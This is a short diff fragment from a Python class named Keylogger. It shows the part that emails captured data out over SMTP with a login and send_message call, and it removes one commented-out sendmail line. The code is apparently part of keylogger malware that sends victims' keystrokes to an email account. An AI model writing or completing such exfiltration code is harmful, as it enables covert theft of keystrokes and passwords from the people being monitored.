@@ -53,7 +53,6 @@ class Keylogger:
         server.starttls()
         server.login(user = email, password = password)
         server.send_message(msg)
-        # server.sendmail(from_addr = email, to_addrs = email, msg = message)
         server.quit()
 
 
